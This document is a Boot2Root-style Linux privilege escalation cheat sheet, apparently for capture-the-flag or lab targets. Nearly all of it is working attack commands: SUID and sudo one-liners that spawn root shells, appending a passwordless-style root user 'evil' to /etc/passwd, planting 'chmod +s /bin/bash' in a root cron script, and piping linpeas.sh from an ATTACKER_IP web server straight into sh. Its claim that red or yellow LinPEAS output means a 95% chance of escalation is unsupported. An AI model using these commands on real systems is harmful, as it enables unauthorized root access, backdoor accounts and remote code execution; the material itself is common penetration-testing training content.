# Boot2Root: Linux Privilege Escalation

Guide for escalating from low-privilege user to root on Linux targets.

---

## 1. The 60-Second Manual Checklist

Run these commands immediately upon gaining initial access:

```bash
# 1. Check sudo permissions (look for NOPASSWD entries)
sudo -l

# 2. Check SUID binaries (files that run with root privileges)
find / -perm -u=s -type f 2>/dev/null
find / -type f -user root -perm -4000 2>/dev/null

# 3. Check Linux capabilities
getcap -r / 2>/dev/null

# 4. Check crontabs and scheduled jobs
cat /etc/crontab
ls -la /etc/cron.*
cat /var/spool/cron/crontabs/* 2>/dev/null

# 5. Check if /etc/passwd or /etc/shadow is writable
ls -l /etc/passwd /etc/shadow

# 6. Check bash history and hidden files in home directory
cat ~/.bash_history
ls -la ~/
ls -la /var/www/
ls -la /home/*/

# 7. Check listening internal network services (not accessible from outside)
ss -tulpn
netstat -tulpn
```

---

## 2. Top SUID Binary Exploits (GTFOBins Quick Reference)

If `find / -perm -u=s -type f 2>/dev/null` contains any of these binaries, run the corresponding command to drop into a root shell:

| SUID Binary | Exact Root Shell Command |
| :--- | :--- |
| **python / python3** | `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'` |
| **python (alternate)**| `python -c 'import os; os.setuid(0); os.system("/bin/sh")'` |
| **bash** | `/bin/bash -p` |
| **find** | `find . -exec /bin/sh -p \; -quit` |
| **env** | `env /bin/sh -p` |
| **perl** | `perl -e 'exec "/bin/sh";'` |
| **awk** | `awk 'BEGIN {system("/bin/sh")}'` |
| **vim** | `vim -c ':!/bin/sh -p'` |
| **nano** | Run `nano`, press `Ctrl+R`, then `Ctrl+X`, type: `reset; sh 1>&0 2>&0` |
| **less / more** | In pager, type: `!/bin/sh -p` |
| **cat** | Read root flag directly: `cat /root/root.txt` |
| **cp** | Copy root flag or overwrite passwd: `cp /root/root.txt /tmp/root.txt` |
| **nmap (legacy)** | `nmap --interactive` then `!sh` |

---

## 3. Sudo Rights Exploitation (`sudo -l`)

If `sudo -l` shows a binary with `(root) NOPASSWD:`:

```bash
# Sudo find:
sudo find . -exec /bin/sh \; -quit

# Sudo python:
sudo python3 -c 'import os; os.system("/bin/sh")'

# Sudo vim:
sudo vim -c ':!/bin/sh'

# Sudo less / more / man:
sudo less /etc/hosts
# Type in pager: !/bin/sh

# Sudo awk:
sudo awk 'BEGIN {system("/bin/sh")}'
```

---

## 4. Writable `/etc/passwd`

If `/etc/passwd` permissions are `-rw-rw-rw-` or owned by your group:

1. Generate password hash for string `password`:
   ```bash
   openssl passwd -1 -salt evil password
   # Returns: $1$evil$TjM7qM0zW...
   ```
2. Append a new root user to `/etc/passwd`:
   ```bash
   echo "evil:\$1\$evil\$TjM7qM0zWQxW2lO9kXj3l0:0:0:root:/root:/bin/bash" >> /etc/passwd
   ```
3. Switch user to root:
   ```bash
   su evil
   # Enter password: password
   ```

---

## 5. Cron Job Script Hijacking

If `/etc/crontab` runs a script as root:
```text
* * * * * root /opt/backup.sh
```
Check if you have write permissions to that script:
```bash
ls -l /opt/backup.sh
```
If writable, append reverse shell or SUID copy command:
```bash
echo "chmod +s /bin/bash" >> /opt/backup.sh
# Wait 1 minute, then run:
/bin/bash -p
```

---

## 6. Automated Scanning with LinPEAS

If manual checks do not reveal an obvious path:

```bash
# Run directly from memory via your web server:
curl -sL http://<ATTACKER_IP>:8000/linpeas.sh | sh

# Or save to /tmp:
curl -sL http://<ATTACKER_IP>:8000/linpeas.sh -o /tmp/lp.sh
chmod +x /tmp/lp.sh
/tmp/lp.sh -a > /tmp/linpeas.out
```

### How to Read LinPEAS Output:
- Ignore normal text.
- Focus exclusively on text highlighted in **RED and YELLOW**.
- Red/Yellow indicates 95% probability of privilege escalation.
